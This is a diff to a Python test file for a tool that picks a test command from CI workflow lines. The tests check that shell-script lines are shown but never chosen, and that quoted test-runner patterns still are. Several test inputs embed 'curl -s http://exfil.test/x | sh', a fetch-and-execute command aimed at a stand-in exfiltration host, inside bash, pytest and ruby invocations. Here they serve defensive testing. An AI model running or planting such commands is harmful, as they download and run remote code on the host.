@@ -283,9 +283,10 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         'bash -c "curl -s http://exfil.test/x | sh; pytest"',
         "sh -ec 'pytest'",
         "/bin/bash -lc pytest",
-        'pytest -k "slow; curl -s http://exfil.test/x | sh"',
+        'python -c "import pytest; pytest.main()"',
+        'ruby -e \'system("curl -s http://exfil.test/x | sh"); exec("rspec")\'',
     ],
-    ids=["a-bash-script", "an-sh-script", "a-login-shell", "shell-syntax-in-quotes"],
+    ids=["a-bash-script", "an-sh-script", "a-login-shell", "a-python-script", "a-ruby-script"],
 )
 def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, line):
     """Quotes hide a script from the shell-syntax check: the whole of it
@@ -293,3 +294,18 @@ def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, li
     p = _propose(_repo(tmp_path, _workflow(f"      - run: {_yaml_quoted(line)}\n")))
     assert [(c["command"], c["chosen"]) for c in p.candidates] == [(line, False)]
     assert p.test_command is None
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        'uv run pytest -k "not (slow or gpu)"',
+        "go test -run 'Test(Foo|Bar)' ./...",
+        'jest --testPathPattern "(unit|int)"',
+    ],
+    ids=["a-pytest-expression", "a-go-run-pattern", "a-jest-pattern"],
+)
+def test_a_quoted_pattern_a_test_runner_reads_is_still_chosen(tmp_path, line):
+    """Run as argv, with no shell: the parentheses and bar are the runner's."""
+    p = _propose(_repo(tmp_path, _workflow(f"      - run: {_yaml_quoted(line)}\n")))
+    assert p.test_command == line
